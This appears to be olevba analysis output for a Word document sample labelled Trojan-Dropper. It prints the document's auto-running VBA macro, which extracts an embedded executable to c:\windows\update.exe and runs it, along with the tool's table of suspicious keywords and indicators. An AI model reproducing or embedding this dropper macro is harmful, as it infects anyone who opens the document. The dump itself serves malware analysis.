olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan-Dropper.MSWord.Generat.a-764466d5dc992afbac75a009e59b6b94a500beb4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan-Dropper.MSWord.Generat.a-764466d5dc992afbac75a009e59b6b94a500beb4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_New()

End Sub

Private Sub Document_Open()
Dim buffer(65536) As Byte
Dim h, h2, j, i, k As Long
h = createfile(ThisDocument.Path & "/" & ThisDocument.Name, generic_read, file_share_read + file_share_write, 0, open_existing, 0, 0)

h2 = createfile("c:\windows\update.exe", generic_write, 0, 0, create_always, 0, 0)

If h = invalid_handle_value Then
Exit Sub
End If
k = SetFilePointer(h, 39424, nil, 0)

Do
i = ReadFile(h, buffer(0), 65536, j, 0)
i = WriteFile(h2, buffer(0), j, j, 0)
Loop Until j < 65536
CloseHandle (h)
CloseHandle (h2)
Shell ("c:\windows\update.exe")

End Sub
-------------------------------------------------------------------------------
VBA MACRO 模块1.bas 
in file: Trojan-Dropper.MSWord.Generat.a-764466d5dc992afbac75a009e59b6b94a500beb4 - OLE stream: 'Macros/VBA/模块1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Declare Function createfile Lib "kernel32" Alias "CreateFileA" (ByVal lpfilename As String, ByVal dwdesiredaccess As Long, ByVal dwsharemode As Long, ByVal lpsecurityattributes As Long, ByVal dwcreationdistribution As Long, ByVal dwflagsandattributes As Long, ByVal htemplate As Long) As Long

Declare Function CloseHandle Lib "kernel32" (ByVal hobject As Long) As Long

Declare Function ReadFile Lib "kernel32" (ByVal hfile As Long, lpbuffer As Byte, ByVal dwnumberofbytestoread As Long, lpnumberofbytesread As Long, ByVal lpoverlapped As Long) As Long

Declare Function WriteFile Lib "kernel32" (ByVal hfile As Long, lpbuffer As Byte, ByVal dwnumberofbytestowrite As Long, lpnumberofbyteswritten As Long, ByVal lpoverlapped As Long) As Long

Declare Function SetFilePointer Lib "kernel32" (ByVal hfile As Long, ByVal ldistancetomove As Long, ByVal lpdistancetomovehigh As Long, ByVal dwmovemethod As Long) As Long

Public Const generic_read As Long = &H80000000
Public Const generic_write As Long = &H40000000
Public Const file_share_read As Long = 1
Public Const file_share_write As Long = 2
Public Const create_new As Long = 1
Public Const create_always As Long = 2
Public Const open_existing As Long = 3
Public Const open_always As Long = 4
Public Const truncate_existing As Long = 5
Public Const invalid_handle_value As Long = -1
Public Const file_attribute_normal As Long = &H80

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |update.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

